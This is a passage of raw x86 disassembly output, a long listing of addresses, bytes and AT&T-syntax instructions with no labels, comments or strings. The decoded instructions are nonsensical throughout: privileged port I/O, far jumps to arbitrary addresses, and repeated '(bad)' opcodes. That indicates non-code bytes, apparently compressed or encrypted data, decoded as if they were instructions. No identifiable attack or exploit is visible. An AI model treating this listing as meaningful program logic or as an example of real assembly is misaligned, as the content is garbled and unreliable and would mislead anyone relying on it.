  434513:	3e da b1 cd 3c f9 bf 	fidivl %ds:-0x4006c333(%ecx)
  43451a:	02 33                	add    (%ebx),%dh
  43451c:	77 9e                	ja     0x4344bc
  43451e:	12 bd d7 b6 7b 47    	adc    0x477bb6d7(%ebp),%bh
  434524:	29 b5 f6 b7 26 fb    	sub    %esi,-0x4d9480a(%ebp)
  43452a:	03 d5                	add    %ebp,%edx
  43452c:	8a 81 35 ce 53 1b    	mov    0x1b53ce35(%ecx),%al
  434532:	ae                   	scas   %es:(%edi),%al
  434533:	fb                   	sti
  434534:	97                   	xchg   %eax,%edi
  434535:	e1 e9                	loope  0x434520
  434537:	0e                   	push   %cs
  434538:	c0 6d d3 94          	shrb   $0x94,-0x2d(%ebp)
  43453c:	c2 1b 10             	ret    $0x101b
  43453f:	ae                   	scas   %es:(%edi),%al
  434540:	29 26                	sub    %esp,(%esi)
  434542:	7d 13                	jge    0x434557
  434544:	98                   	cwtl
  434545:	af                   	scas   %es:(%edi),%eax
  434546:	10 15 89 7a f8 d0    	adc    %dl,0xd0f87a89
  43454c:	61                   	popa
  43454d:	66 60                	pushaw
  43454f:	5b                   	pop    %ebx
  434550:	7c 08                	jl     0x43455a
  434552:	60                   	pusha
  434553:	e8 40 7a d6 89       	call   0x8a19bf98
  434558:	ab                   	stos   %eax,%es:(%edi)
  434559:	be 6d 3f 41 43       	mov    $0x43413f6d,%esi
  43455e:	f7 a8 9b 75 90 a1    	imull  -0x5e6f8a65(%eax)
  434564:	93                   	xchg   %eax,%ebx
  434565:	c3                   	ret
  434566:	48                   	dec    %eax
  434567:	40                   	inc    %eax
  434568:	78 4c                	js     0x4345b6
  43456a:	61                   	popa
  43456b:	17                   	pop    %ss
  43456c:	0c 74                	or     $0x74,%al
  43456e:	a1 df 94 c5 af       	mov    0xafc594df,%eax
  434573:	be f0 2a bc d9       	mov    $0xd9bc2af0,%esi
  434578:	f3 61                	repz popa
  43457a:	f9                   	stc
  43457b:	1b 63 27             	sbb    0x27(%ebx),%esp
  43457e:	c8 52 db 21          	enter  $0xdb52,$0x21
  434582:	a9 3f e8 1d 3d       	test   $0x3d1de83f,%eax
  434587:	81 c7 dc 04 34 ed    	add    $0xed3404dc,%edi
  43458d:	5a                   	pop    %edx
  43458e:	04 5d                	add    $0x5d,%al
  434590:	7c 79                	jl     0x43460b
  434592:	e3 f9                	jecxz  0x43458d
  434594:	b6 4e                	mov    $0x4e,%dh
  434596:	ad                   	lods   %ds:(%esi),%eax
  434597:	9a 22 e3 00 49 0f 95 	lcall  $0x950f,$0x4900e322
  43459e:	5b                   	pop    %ebx
  43459f:	6c                   	insb   (%dx),%es:(%edi)
  4345a0:	e4 34                	in     $0x34,%al
  4345a2:	0d 10 f3 d9 57       	or     $0x57d9f310,%eax
  4345a7:	4a                   	dec    %edx
  4345a8:	36 9d                	ss popf
  4345aa:	0a a9 dc e1 2c 99    	or     -0x66d31e24(%ecx),%ch
  4345b0:	50                   	push   %eax
  4345b1:	24 d5                	and    $0xd5,%al
  4345b3:	09 a9 c1 7d 94 72    	or     %ebp,0x72947dc1(%ecx)
  4345b9:	13 82 54 be a2 03    	adc    0x3a2be54(%edx),%eax
  4345bf:	24 af                	and    $0xaf,%al
  4345c1:	40                   	inc    %eax
  4345c2:	77 12                	ja     0x4345d6
  4345c4:	b5 65                	mov    $0x65,%ch
  4345c6:	a9 29 c6 d4 70       	test   $0x70d4c629,%eax
  4345cb:	31 0a                	xor    %ecx,(%edx)
  4345cd:	97                   	xchg   %eax,%edi
  4345ce:	ed                   	in     (%dx),%eax
  4345cf:	17                   	pop    %ss
  4345d0:	bb a0 1e a6 e5       	mov    $0xe5a61ea0,%ebx
  4345d5:	e4 ae                	in     $0xae,%al
  4345d7:	f2 a1 e2 3e 55 ff    	repnz mov 0xff553ee2,%eax
  4345dd:	db e9                	fucomi %st(1),%st
  4345df:	a1 6a 6b 97 c9       	mov    0xc9976b6a,%eax
  4345e4:	08 7f ed             	or     %bh,-0x13(%edi)
  4345e7:	ea 5c 03 94 f8 9c 55 	ljmp   $0x559c,$0xf894035c
  4345ee:	ca 5e c6             	lret   $0xc65e
  4345f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4345f2:	7b 33                	jnp    0x434627
  4345f4:	aa                   	stos   %al,%es:(%edi)
  4345f5:	63 58 a9             	arpl   %ebx,-0x57(%eax)
  4345f8:	57                   	push   %edi
  4345f9:	9f                   	lahf
  4345fa:	b5 39                	mov    $0x39,%ch
  4345fc:	a9 a3 25 74 02       	test   $0x27425a3,%eax
  434601:	06                   	push   %es
  434602:	c7                   	(bad)
  434603:	95                   	xchg   %eax,%ebp
  434604:	22 d5                	and    %ch,%dl
  434606:	2f                   	das
  434607:	c6                   	(bad)
  434608:	66 8c 90 86 f0 96 47 	data16 mov %ss,0x4796f086(%eax)
  43460f:	bd 53 4f e3 57       	mov    $0x57e34f53,%ebp
  434614:	ec                   	in     (%dx),%al
  434615:	18 1c 74             	sbb    %bl,(%esp,%esi,2)
  434618:	72 78                	jb     0x434692
  43461a:	73 18                	jae    0x434634
  43461c:	7c 19                	jl     0x434637
  43461e:	e8 40 a0 67 50       	call   0x50aae663
  434623:	57                   	push   %edi
  434624:	f4                   	hlt
  434625:	36 81 af 8d 46 2d 67 	subl   $0x6183f79c,%ss:0x672d468d(%edi)
  43462c:	9c f7 83 61 
  434630:	cb                   	lret
  434631:	60                   	pusha
  434632:	8d                   	lea    (bad),%edi
  434633:	fa                   	cli
  434634:	f5                   	cmc
  434635:	03 ea                	add    %edx,%ebp
  434637:	f5                   	cmc
  434638:	ae                   	scas   %es:(%edi),%al
  434639:	ab                   	stos   %eax,%es:(%edi)
  43463a:	67 54                	addr16 push %esp
  43463c:	5b                   	pop    %ebx
  43463d:	28 3b                	sub    %bh,(%ebx)
  43463f:	24 fd                	and    $0xfd,%al
  434641:	5c                   	pop    %esp
  434642:	1a 77 21             	sbb    0x21(%edi),%dh
  434645:	29 ba 30 7d 6b e9    	sub    %edi,-0x169482d0(%edx)
  43464b:	04 48                	add    $0x48,%al
  43464d:	1b 24 9f             	sbb    (%edi,%ebx,4),%esp
  434650:	2a d3                	sub    %bl,%dl
  434652:	c5 b9 03 ef 7c 12    	lds    0x127cef03(%ecx),%edi
  434658:	e5 1c                	in     $0x1c,%eax
  43465a:	b6 f6                	mov    $0xf6,%dh
  43465c:	80 80 c5 41 c2 c4 38 	addb   $0x38,-0x3b3dbe3b(%eax)
  434663:	84 9b 32 db b9 1a    	test   %bl,0x1ab9db32(%ebx)
  434669:	47                   	inc    %edi
  43466a:	c0 4c 8b 89 5b       	rorb   $0x5b,-0x77(%ebx,%ecx,4)
  43466f:	f8                   	clc
  434670:	b9 21 7b 38 5c       	mov    $0x5c387b21,%ecx
  434675:	ef                   	out    %eax,(%dx)
  434676:	32 75 25             	xor    0x25(%ebp),%dh
  434679:	2c c4                	sub    $0xc4,%al
  43467b:	3a b4 da c6 b6 f2 30 	cmp    0x30f2b6c6(%edx,%ebx,8),%dh
  434682:	fb                   	sti
  434683:	64 94                	fs xchg %eax,%esp
  434685:	a2 6a e3 f8 c0       	mov    %al,0xc0f8e36a
  43468a:	e1 0c                	loope  0x434698
  43468c:	2d 9b f0 5d f7       	sub    $0xf75df09b,%eax
  434691:	9d                   	popf
  434692:	63 89 a4 18 ee 68    	arpl   %ecx,0x68ee18a4(%ecx)
  434698:	cd 00                	int    $0x0
  43469a:	1e                   	push   %ds
  43469b:	c3                   	ret
  43469c:	af                   	scas   %es:(%edi),%eax
  43469d:	4f                   	dec    %edi
  43469e:	b8 55 7a 2b 61       	mov    $0x612b7a55,%eax
  4346a3:	db f4                	fcomi  %st(4),%st
  4346a5:	10 9e 21 71 0d b4    	adc    %bl,-0x4bf28edf(%esi)
  4346ab:	58                   	pop    %eax
  4346ac:	42                   	inc    %edx
  4346ad:	fe 4e 2f             	decb   0x2f(%esi)
  4346b0:	10 30                	adc    %dh,(%eax)
  4346b2:	c4 2e                	les    (%esi),%ebp
  4346b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4346b5:	af                   	scas   %es:(%edi),%eax
  4346b6:	1c 43                	sbb    $0x43,%al
  4346b8:	e1 ca                	loope  0x434684
  4346ba:	8d 9a f2 b5 54 32    	lea    0x3254b5f2(%edx),%ebx
  4346c0:	86 72 ab             	xchg   %dh,-0x55(%edx)
  4346c3:	c6                   	(bad)
  4346c4:	b5 ee                	mov    $0xee,%ch
  4346c6:	a8 39                	test   $0x39,%al
  4346c8:	33 8e 5e c9 4b 30    	xor    0x304bc95e(%esi),%ecx
  4346ce:	64 1c 4f             	fs sbb $0x4f,%al
  4346d1:	d5 a9                	aad    $0xa9
  4346d3:	e3 e9                	jecxz  0x4346be
  4346d5:	63 69 c3             	arpl   %ebp,-0x3d(%ecx)
  4346d8:	48                   	dec    %eax
  4346d9:	7f ca                	jg     0x4346a5
  4346db:	7f af                	jg     0x43468c
  4346dd:	26 df 96 ce a9 26 81 	fists  %es:-0x7ed95632(%esi)
  4346e4:	b8 51 e2 77 60       	mov    $0x6077e251,%eax
  4346e9:	17                   	pop    %ss
  4346ea:	ae                   	scas   %es:(%edi),%al
  4346eb:	5e                   	pop    %esi
  4346ec:	0d 1a 4e 05 20       	or     $0x20054e1a,%eax
  4346f1:	13 22                	adc    (%edx),%esp
  4346f3:	d9 48 06             	(bad) 0x6(%eax)
  4346f6:	de d3                	(bad)
  4346f8:	12 d2                	adc    %dl,%dl
  4346fa:	d3 ef                	shr    %cl,%edi
  4346fc:	3b ba 7c 90 26 1e    	cmp    0x1e26907c(%edx),%edi
  434702:	d8 d4                	fcom   %st(4)
  434704:	0d ad 87 99 fa       	or     $0xfa9987ad,%eax
  434709:	0d 7a 6f 44 a0       	or     $0xa0446f7a,%eax
  43470e:	d3 87 28 4b 93 6e    	roll   %cl,0x6e934b28(%edi)
  434714:	30 fb                	xor    %bh,%bl
  434716:	24 86                	and    $0x86,%al
  434718:	88 3f                	mov    %bh,(%edi)
  43471a:	6c                   	insb   (%dx),%es:(%edi)
  43471b:	b6 4d                	mov    $0x4d,%dh
  43471d:	76 ac                	jbe    0x4346cb
  43471f:	ae                   	scas   %es:(%edi),%al
  434720:	c9                   	leave
  434721:	25 0f 41 9b d0       	and    $0xd09b410f,%eax
  434726:	59                   	pop    %ecx
  434727:	d0 98 98 27 f7 1b    	rcrb   $1,0x1bf72798(%eax)
  43472d:	c9                   	leave
  43472e:	d5 91                	aad    $0x91
  434730:	03 a7 e6 2a 6e 50    	add    0x506e2ae6(%edi),%esp
  434736:	6e                   	outsb  %ds:(%esi),(%dx)
  434737:	35 40 00 a5 b7       	xor    $0xb7a50040,%eax
  43473c:	7e 77                	jle    0x4347b5
  43473e:	db 1d 92 4c a8 b7    	fistpl 0xb7a84c92
  434744:	f2 a9 d3 20 17 9c    	repnz test $0x9c1720d3,%eax
  43474a:	86 c6                	xchg   %al,%dh
  43474c:	f6 c1 07             	test   $0x7,%cl
  43474f:	f1                   	int1
  434750:	e7 4b                	out    %eax,$0x4b
  434752:	f5                   	cmc
  434753:	ea 14 e7 2f 98 e1 d6 	ljmp   $0xd6e1,$0x982fe714
  43475a:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
  43475c:	14 e0                	adc    $0xe0,%al
  43475e:	de 5c fd 82          	ficomps -0x7e(%ebp,%edi,8)
  434762:	3f                   	aas
  434763:	e3 b0                	jecxz  0x434715
  434765:	aa                   	stos   %al,%es:(%edi)
  434766:	b6 0b                	mov    $0xb,%dh
  434768:	ce                   	into
  434769:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43476a:	be 8b 55 82 29       	mov    $0x2982558b,%esi
  43476f:	55                   	push   %ebp
  434770:	e2 f9                	loop   0x43476b
  434772:	0f cd                	bswap  %ebp
  434774:	9d                   	popf
  434775:	f5                   	cmc
  434776:	29 53 70             	sub    %edx,0x70(%ebx)
  434779:	7c de                	jl     0x434759
  43477b:	09 af 5e 75 d3 e3    	or     %ebp,-0x1c2c8aa2(%edi)
  434781:	0a 2c aa             	or     (%edx,%ebp,4),%ch
  434784:	11 e6                	adc    %esp,%esi
  434786:	22 6b 00             	and    0x0(%ebx),%ch
  434789:	b5 7e                	mov    $0x7e,%ch
  43478b:	03 ad 30 ac 4a 3a    	add    0x3a4aac30(%ebp),%ebp
  434791:	e5 e3                	in     $0xe3,%eax
  434793:	6d                   	insl   (%dx),%es:(%edi)
  434794:	f3 9c                	repz pushf
  434796:	77 b5                	ja     0x43474d
  434798:	2c 7d                	sub    $0x7d,%al
  43479a:	9d                   	popf
  43479b:	90                   	nop
  43479c:	20 a4 63 db 6d 81 a4 	and    %ah,-0x5b7e9225(%ebx,%eiz,2)
  4347a3:	04 a8                	add    $0xa8,%al
  4347a5:	93                   	xchg   %eax,%ebx
  4347a6:	28 74 e5 8d          	sub    %dh,-0x73(%ebp,%eiz,8)
  4347aa:	ae                   	scas   %es:(%edi),%al
  4347ab:	e3 26                	jecxz  0x4347d3
  4347ad:	d4 f8                	aam    $0xf8
  4347af:	e8 c7 e6 14 17       	call   0x17582e7b
  4347b4:	56                   	push   %esi
  4347b5:	06                   	push   %es
  4347b6:	98                   	cwtl
  4347b7:	33 fe                	xor    %esi,%edi
  4347b9:	7a 0c                	jp     0x4347c7
  4347bb:	2c 1b                	sub    $0x1b,%al
  4347bd:	22 5e 7f             	and    0x7f(%esi),%bl
  4347c0:	e4 aa                	in     $0xaa,%al
  4347c2:	dd d3                	fst    %st(3)
  4347c4:	6d                   	insl   (%dx),%es:(%edi)
  4347c5:	d1 52 b8             	rcll   $1,-0x48(%edx)
  4347c8:	d3 80 57 da 04 54    	roll   %cl,0x5404da57(%eax)
  4347ce:	d2 7f 4e             	sarb   %cl,0x4e(%edi)
  4347d1:	8b 2b                	mov    (%ebx),%ebp
  4347d3:	9d                   	popf
  4347d4:	5f                   	pop    %edi
  4347d5:	a1 5b 5e 59 93       	mov    0x93595e5b,%eax
  4347da:	e6 a2                	out    %al,$0xa2
  4347dc:	d7                   	xlat   %ds:(%ebx)
  4347dd:	0d 0c 22 d9 3b       	or     $0x3bd9220c,%eax
  4347e2:	d2 2f                	shrb   %cl,(%edi)
  4347e4:	b0 ec                	mov    $0xec,%al
  4347e6:	5d                   	pop    %ebp
  4347e7:	7f bc                	jg     0x4347a5
  4347e9:	2e 76 03             	jbe,pn 0x4347ef
  4347ec:	4c                   	dec    %esp
  4347ed:	69 22 bc c9 77 d6    	imul   $0xd677c9bc,(%edx),%esp
  4347f3:	71 96                	jno    0x43478b
  4347f5:	eb 16                	jmp    0x43480d
  4347f7:	24 e3                	and    $0xe3,%al
  4347f9:	1c 83                	sbb    $0x83,%al
  4347fb:	b7 3e                	mov    $0x3e,%bh
  4347fd:	ab                   	stos   %eax,%es:(%edi)
  4347fe:	f3 db c4             	repz fcmovnb %st(4),%st
  434801:	06                   	push   %es
  434802:	f8                   	clc
  434803:	68 a0 99 4b 72       	push   $0x724b99a0
  434808:	43                   	inc    %ebx
  434809:	35 fb 77 b3 aa       	xor    $0xaab377fb,%eax
  43480e:	c7                   	(bad)
  43480f:	60                   	pusha
  434810:	55                   	push   %ebp
  434811:	b7 b4                	mov    $0xb4,%bh
  434813:	36 f8                	ss clc
  434815:	a8 31                	test   $0x31,%al
  434817:	b8 07 67 06 b9       	mov    $0xb9066707,%eax
  43481c:	67 66 b6 c0          	addr16 data16 mov $0xc0,%dh
  434820:	0e                   	push   %cs
  434821:	d2 7a 81             	sarb   %cl,-0x7f(%edx)
  434824:	de c0                	faddp  %st,%st(0)
  434826:	9b                   	fwait
  434827:	cc                   	int3
  434828:	d4 47                	aam    $0x47
  43482a:	2f                   	das
  43482b:	c4 c2 e2 42          	(bad)
  43482f:	30 d3                	xor    %dl,%bl
  434831:	69 58 d6 e0 5d 2d 41 	imul   $0x412d5de0,-0x2a(%eax),%ebx
  434838:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434839:	4b                   	dec    %ebx
  43483a:	5d                   	pop    %ebp
  43483b:	ae                   	scas   %es:(%edi),%al
  43483c:	11 af 38 3a 4a af    	adc    %ebp,-0x50b5c5c8(%edi)
  434842:	32 41 30             	xor    0x30(%ecx),%al
  434845:	0e                   	push   %cs
  434846:	1d 95 e3 c9 20       	sbb    $0x20c9e395,%eax
  43484b:	2e b9 c4 bd aa 18    	cs mov $0x18aabdc4,%ecx
  434851:	63 da                	arpl   %ebx,%edx
  434853:	8a f9                	mov    %cl,%bh
  434855:	45                   	inc    %ebp
  434856:	15 26 1e 8f 84       	adc    $0x848f1e26,%eax
  43485b:	d0 e1                	shl    $1,%cl
  43485d:	c2 56 5e             	ret    $0x5e56
  434860:	a1 67 ea 01 3e       	mov    0x3e01ea67,%eax
  434865:	8a a0 85 b8 73 36    	mov    0x3673b885(%eax),%ah
  43486b:	6c                   	insb   (%dx),%es:(%edi)
  43486c:	fb                   	sti
  43486d:	04 dd                	add    $0xdd,%al
  43486f:	19 8d c0 19 e8 ff    	sbb    %ecx,-0x17e640(%ebp)
  434875:	29 e5                	sub    %esp,%ebp
  434877:	49                   	dec    %ecx
  434878:	bb f3 cb 96 49       	mov    $0x4996cbf3,%ebx
  43487d:	ca c9 e6             	lret   $0xe6c9
  434880:	14 e6                	adc    $0xe6,%al
  434882:	1d 9a 55 66 00       	sbb    $0x66559a,%eax
  434887:	88 4f d8             	mov    %cl,-0x28(%edi)
  43488a:	df 7f 15             	fistpll 0x15(%edi)
  43488d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43488e:	33 01                	xor    (%ecx),%eax
  434890:	70 9f                	jo     0x434831
  434892:	2e 6b 97 c4 09 22 09 	imul   $0x23,%cs:0x92209c4(%edi),%edx
  434899:	23 
  43489a:	cf                   	iret
  43489b:	3c e6                	cmp    $0xe6,%al
  43489d:	b2 2f                	mov    $0x2f,%dl
  43489f:	ce                   	into
  4348a0:	fb                   	sti
  4348a1:	63 f7                	arpl   %esi,%edi
  4348a3:	3c 00                	cmp    $0x0,%al
  4348a5:	92                   	xchg   %eax,%edx
  4348a6:	ea e8 41 81 7a bc 89 	ljmp   $0x89bc,$0x7a8141e8
  4348ad:	05 af 88 d7 82       	add    $0x82d788af,%eax
  4348b2:	81 05 cc 39 35 fa 04 	addl   $0x42bc5c04,0xfa3539cc
  4348b9:	5c bc 42 
  4348bc:	ba b7 b9 31 f6       	mov    $0xf631b9b7,%edx
  4348c1:	fa                   	cli
  4348c2:	3a f8                	cmp    %al,%bh
  4348c4:	ad                   	lods   %ds:(%esi),%eax
  4348c5:	cf                   	iret
  4348c6:	0b db                	or     %ebx,%ebx
  4348c8:	67 96                	addr16 xchg %eax,%esi
  4348ca:	de d2                	(bad)
  4348cc:	42                   	inc    %edx
  4348cd:	52                   	push   %edx
  4348ce:	de 5c 17 3a          	ficomps 0x3a(%edi,%edx,1)
  4348d2:	07                   	pop    %es
  4348d3:	a3 bf f2 cc 3c       	mov    %eax,0x3cccf2bf
  4348d8:	96                   	xchg   %eax,%esi
  4348d9:	5a                   	pop    %edx
  4348da:	b1 eb                	mov    $0xeb,%cl
  4348dc:	2d c4 81 90 cb       	sub    $0xcb9081c4,%eax
  4348e1:	8b 1c c3             	mov    (%ebx,%eax,8),%ebx
  4348e4:	1d c8 36 00 26       	sbb    $0x260036c8,%eax
  4348e9:	41                   	inc    %ecx
  4348ea:	28 c8                	sub    %cl,%al
  4348ec:	da 65 96             	fisubl -0x6a(%ebp)
  4348ef:	d5 20                	aad    $0x20
  4348f1:	f3 76 a8             	repz jbe 0x43489c
  4348f4:	7b bd                	jnp    0x4348b3
  4348f6:	32 8e 4b 54 b4 26    	xor    0x26b4544b(%esi),%cl
  4348fc:	91                   	xchg   %eax,%ecx
  4348fd:	14 a9                	adc    $0xa9,%al
  4348ff:	c0 4d eb 69          	rorb   $0x69,-0x15(%ebp)
  434903:	4c                   	dec    %esp
  434904:	4c                   	dec    %esp
  434905:	50                   	push   %eax
  434906:	ab                   	stos   %eax,%es:(%edi)
  434907:	1d 96 f5 04 27       	sbb    $0x2704f596,%eax
  43490c:	79 a6                	jns    0x4348b4
  43490e:	08 19                	or     %bl,(%ecx)
  434910:	78 e0                	js     0x4348f2
  434912:	e4 86                	in     $0x86,%al
  434914:	03 cf                	add    %edi,%ecx
  434916:	1b 23                	sbb    (%ebx),%esp
  434918:	d2 3e                	sarb   %cl,(%esi)
  43491a:	53                   	push   %ebx
  43491b:	93                   	xchg   %eax,%ebx
  43491c:	e3 8f                	jecxz  0x4348ad
  43491e:	63 36                	arpl   %esi,(%esi)
  434920:	30 2a                	xor    %ch,(%edx)
  434922:	01 30                	add    %esi,(%eax)
  434924:	c4 0b                	les    (%ebx),%ecx
  434926:	99                   	cltd
  434927:	ac                   	lods   %ds:(%esi),%al
  434928:	1d fe 75 3f e9       	sbb    $0xe93f75fe,%eax
  43492d:	74 73                	je     0x4349a2
  43492f:	aa                   	stos   %al,%es:(%edi)
  434930:	73 6b                	jae    0x43499d
  434932:	b5 9c                	mov    $0x9c,%ch
  434934:	d3 66 66             	shll   %cl,0x66(%esi)
  434937:	7f 5a                	jg     0x434993
  434939:	1a c7                	sbb    %bh,%al
  43493b:	ac                   	lods   %ds:(%esi),%al
  43493c:	e7 79                	out    %eax,$0x79
  43493e:	83 23 23             	andl   $0x23,(%ebx)
  434941:	df ba 07 55 9d 6f    	fistpll 0x6f9d5507(%edx)
  434947:	ea 13 05 e0 83 8a c9 	ljmp   $0xc98a,$0x83e00513
  43494e:	ba 4e 45 6a e3       	mov    $0xe36a454e,%edx
  434953:	eb 47                	jmp    0x43499c
  434955:	cf                   	iret
  434956:	d9 d6                	(bad)
  434958:	33 93 0a e2 05 2d    	xor    0x2d05e20a(%ebx),%edx
  43495e:	79 02                	jns    0x434962
  434960:	61                   	popa
  434961:	53                   	push   %ebx
  434962:	cc                   	int3
  434963:	86 17                	xchg   %dl,(%edi)
  434965:	b4 a0                	mov    $0xa0,%ah
  434967:	9e                   	sahf
  434968:	4b                   	dec    %ebx
  434969:	1a 9c 81 18 b1 83 56 	sbb    0x5683b118(%ecx,%eax,4),%bl
  434970:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434971:	1c 39                	sbb    $0x39,%al
  434973:	f1                   	int1
  434974:	4f                   	dec    %edi
  434975:	aa                   	stos   %al,%es:(%edi)
  434976:	d6                   	salc
  434977:	50                   	push   %eax
  434978:	54                   	push   %esp
  434979:	90                   	nop
  43497a:	f3 9c                	repz pushf
  43497c:	22 47 b8             	and    -0x48(%edi),%al
  43497f:	5d                   	pop    %ebp
  434980:	55                   	push   %ebp
  434981:	40                   	inc    %eax
  434982:	91                   	xchg   %eax,%ecx
  434983:	de dd                	(bad)
  434985:	1a ad 8e 24 95 43    	sbb    0x4395248e(%ebp),%ch
  43498b:	8a df                	mov    %bh,%bl
  43498d:	c1 c1 ea             	rol    $0xea,%ecx
  434990:	3b 6c 27 d0          	cmp    -0x30(%edi,%eiz,1),%ebp
  434994:	bf 3e af 11 ae       	mov    $0xae11af3e,%edi
  434999:	ae                   	scas   %es:(%edi),%al
  43499a:	0f 3c                	(bad)
  43499c:	67 ce                	addr16 into
  43499e:	88 e6                	mov    %ah,%dh
  4349a0:	9c                   	pushf
  4349a1:	87 89 65 df 22 4d    	xchg   %ecx,0x4d22df65(%ecx)
  4349a7:	fc                   	cld
  4349a8:	2d 06 81 e9 ca       	sub    $0xcae98106,%eax
  4349ad:	6c                   	insb   (%dx),%es:(%edi)
  4349ae:	e8 1e 56 99 6a       	call   0x6adc9fd1
  4349b3:	32 8a e5 34 e1 f1    	xor    -0xe1ecb1b(%edx),%cl
  4349b9:	5d                   	pop    %ebp
  4349ba:	6d                   	insl   (%dx),%es:(%edi)
  4349bb:	e4 5d                	in     $0x5d,%al
  4349bd:	44                   	inc    %esp
  4349be:	40                   	inc    %eax
  4349bf:	dd 4a b5             	fisttpll -0x4b(%edx)
  4349c2:	65 04 dd             	gs add $0xdd,%al
  4349c5:	cb                   	lret
  4349c6:	91                   	xchg   %eax,%ecx
  4349c7:	63 71 e6             	arpl   %esi,-0x1a(%ecx)
  4349ca:	45                   	inc    %ebp
  4349cb:	4d                   	dec    %ebp
  4349cc:	08 21                	or     %ah,(%ecx)
  4349ce:	25 48 7b dd fe       	and    $0xfedd7b48,%eax
  4349d3:	5e                   	pop    %esi
  4349d4:	94                   	xchg   %eax,%esp
  4349d5:	e2 d9                	loop   0x4349b0
  4349d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4349d8:	5a                   	pop    %edx
  4349d9:	d3 1d 58 1a d3 e1    	rcrl   %cl,0xe1d31a58
  4349df:	21 0e                	and    %ecx,(%esi)
  4349e1:	25 61 32 74 26       	and    $0x26743261,%eax
  4349e6:	b3 16                	mov    $0x16,%bl
  4349e8:	f3 bd 07 29 a9 34    	repz mov $0x34a92907,%ebp
  4349ee:	ac                   	lods   %ds:(%esi),%al
  4349ef:	07                   	pop    %es
  4349f0:	c7                   	(bad)
  4349f1:	d0 4d b3             	rorb   $1,-0x4d(%ebp)
  4349f4:	0d ea e1 29 3f       	or     $0x3f29e1ea,%eax
  4349f9:	70 26                	jo     0x434a21
  4349fb:	3b 00                	cmp    (%eax),%eax
  4349fd:	cf                   	iret
  4349fe:	1c 4d                	sbb    $0x4d,%al
  434a00:	eb 25                	jmp    0x434a27
  434a02:	ab                   	stos   %eax,%es:(%edi)
  434a03:	d9 40 52             	flds   0x52(%eax)
  434a06:	c9                   	leave
  434a07:	0f 0a                	(bad)
  434a09:	73 e1                	jae    0x4349ec
  434a0b:	b1 dc                	mov    $0xdc,%cl
  434a0d:	98                   	cwtl
  434a0e:	28 81 88 f2 9b 24    	sub    %al,0x249bf288(%ecx)
  434a14:	07                   	pop    %es
  434a15:	2f                   	das
  434a16:	d8 80 6a b7 38 85    	fadds  -0x7ac74896(%eax)
  434a1c:	df 04 1f             	filds  (%edi,%ebx,1)
  434a1f:	64 5d                	fs pop %ebp
  434a21:	f7 f8                	idiv   %eax
  434a23:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434a24:	6d                   	insl   (%dx),%es:(%edi)
  434a25:	47                   	inc    %edi
  434a26:	76 e2                	jbe    0x434a0a
  434a28:	3d dd e7 0d f6       	cmp    $0xf60de7dd,%eax
  434a2d:	3e b1 ea             	ds mov $0xea,%cl
  434a30:	72 ef                	jb     0x434a21
  434a32:	a8 af                	test   $0xaf,%al
  434a34:	60                   	pusha
  434a35:	68 bc e3 b5 74       	push   $0x74b5e3bc
  434a3a:	61                   	popa
  434a3b:	b1 0c                	mov    $0xc,%cl
  434a3d:	a0 1a 92 bd f8       	mov    0xf8bd921a,%al
  434a42:	8f                   	(bad)
  434a43:	2d 00 2a e2 40       	sub    $0x40e22a00,%eax
  434a48:	00 fd                	add    %bh,%ch
  434a4a:	49                   	dec    %ecx
  434a4b:	04 90                	add    $0x90,%al
  434a4d:	b5 0c                	mov    $0xc,%ch
  434a4f:	27                   	daa
  434a50:	43                   	inc    %ebx
  434a51:	f9                   	stc
  434a52:	90                   	nop
  434a53:	3c 9e                	cmp    $0x9e,%al
  434a55:	9b                   	fwait
  434a56:	7d bd                	jge    0x434a15
  434a58:	25 32 c4 48 a8       	and    $0xa848c432,%eax
  434a5d:	e7 8a                	out    %eax,$0x8a
  434a5f:	42                   	inc    %edx
  434a60:	6b e2 d3             	imul   $0xffffffd3,%edx,%esp
  434a63:	1f                   	pop    %ds
  434a64:	1b e0                	sbb    %eax,%esp
  434a66:	ed                   	in     (%dx),%eax
  434a67:	b8 5e f4 01 5f       	mov    $0x5f01f45e,%eax
  434a6c:	53                   	push   %ebx
  434a6d:	75 14                	jne    0x434a83
  434a6f:	d6                   	salc
  434a70:	6b a5 72 fe e6 c6 6f 	imul   $0x6f,-0x3919018e(%ebp),%esp
  434a77:	04 d8                	add    $0xd8,%al
  434a79:	b7 21                	mov    $0x21,%bh
  434a7b:	37                   	aaa
  434a7c:	ec                   	in     (%dx),%al
  434a7d:	1a 8c d3 45 ef 13 be 	sbb    -0x41ec10bb(%ebx,%edx,8),%cl
  434a84:	d4 e8                	aam    $0xe8
  434a86:	1a fe                	sbb    %dh,%bh
  434a88:	74 14                	je     0x434a9e
  434a8a:	ff 31                	push   (%ecx)
  434a8c:	f5                   	cmc
  434a8d:	11 a7 37 95 a7 27    	adc    %esp,0x27a79537(%edi)
  434a93:	29 dc                	sub    %ebx,%esp
  434a95:	be d4 63 52 25       	mov    $0x255263d4,%esi
  434a9a:	d1 a8 47 c2 af 94    	shrl   $1,-0x6b503db9(%eax)
  434aa0:	da a5 d2 ae 31 a1    	fisubl -0x5ece512e(%ebp)
  434aa6:	2a b3 8b 61 b8 a2    	sub    -0x5d479e75(%ebx),%dh
  434aac:	41                   	inc    %ecx
  434aad:	6f                   	outsl  %ds:(%esi),(%dx)
  434aae:	4c                   	dec    %esp
  434aaf:	3e 98                	ds cwtl
  434ab1:	81 f8 77 9b 38 64    	cmp    $0x64389b77,%eax
  434ab7:	d8 72 92             	fdivs  -0x6e(%edx)
  434aba:	33 27                	xor    (%edi),%esp
  434abc:	34 73                	xor    $0x73,%al
  434abe:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434abf:	21 aa ed c7 6e 97    	and    %ebp,-0x68913813(%edx)
  434ac5:	49                   	dec    %ecx
  434ac6:	34 ad                	xor    $0xad,%al
  434ac8:	43                   	inc    %ebx
  434ac9:	ae                   	scas   %es:(%edi),%al
  434aca:	3f                   	aas
  434acb:	b8 76 5b ca 33       	mov    $0x33ca5b76,%eax
  434ad0:	e4 f6                	in     $0xf6,%al
  434ad2:	0d 13 a2 1a bd       	or     $0xbd1aa213,%eax
